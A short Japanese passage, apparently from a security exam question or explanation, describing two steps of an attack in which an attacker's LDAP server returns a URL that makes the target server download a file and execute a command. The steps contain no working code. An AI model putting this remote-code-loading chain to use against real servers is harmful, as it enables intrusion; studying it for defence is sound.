(6) 攻撃用LDAPサーバは,URL-JをLDAPレスポンスに記載して攻撃対象サーバに返す。
(7) 攻撃対象サーバは,受信したLDAP レスポンスに記載されたURL-Jにアクセスし,Jファイルをダウンロードして,コマンドCを実行する。
